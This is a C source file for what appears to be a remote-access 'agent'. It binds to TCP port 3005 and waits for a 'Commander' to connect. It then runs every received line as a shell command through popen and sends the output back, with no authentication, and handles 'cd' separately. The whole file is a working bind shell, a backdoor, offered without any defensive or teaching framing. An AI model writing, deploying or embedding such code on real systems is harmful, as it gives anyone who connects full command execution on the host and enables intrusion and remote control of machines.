#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 3005
#define BUFFER_SIZE 1024

void error(const char *msg)
{
    perror(msg);
}

int main()
{
    int listen_fd, conn_fd;
    struct sockaddr_in serv_addr = {0};
    struct sockaddr_in cli_addr = {0};
    socklen_t clilen = sizeof(cli_addr);
    char buffer[BUFFER_SIZE];

    if ((listen_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("ERROR opening socket");
        exit(1);
    }

    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(PORT);

    if (bind(listen_fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        perror("ERROR on binding");
        exit(1);
    }

    listen(listen_fd, 5);
    printf("Agent is running and listening on port %d...\n", PORT);

    while (1)
    {
        if ((conn_fd = accept(listen_fd, (struct sockaddr *)&cli_addr, &clilen)) < 0)
        {
            perror("ERROR on accept");
            continue;
        }

        printf("\n[+] Commander connected!\n");

        while (1)
        {
            memset(buffer, 0, BUFFER_SIZE);
            ssize_t n = read(conn_fd, buffer, BUFFER_SIZE - 1);

            if (n <= 0)
            {
                printf("[-] Commander disconnected. Waiting for new connection...\n");
                break;
            }

            buffer[strcspn(buffer, "\r\n")] = 0;

            if (strncmp(buffer, "cd ", 3) == 0)
            {
                const char *msg = (chdir(buffer + 3) == 0) ? "Directory changed\n" : "Failed to change directory\n";
                write(conn_fd, msg, strlen(msg));
            }
            else
            {
                FILE *fp = popen(buffer, "r");
                if (!fp)
                {
                    write(conn_fd, "Error executing command\n", 24);
                }
                else
                {
                    while ((n = fread(buffer, 1, sizeof(buffer), fp)) > 0)
                    {
                        write(conn_fd, buffer, n);
                    }
                    pclose(fp);
                }
            }
        }
        close(conn_fd);
    }

    close(listen_fd);
    return 0;
}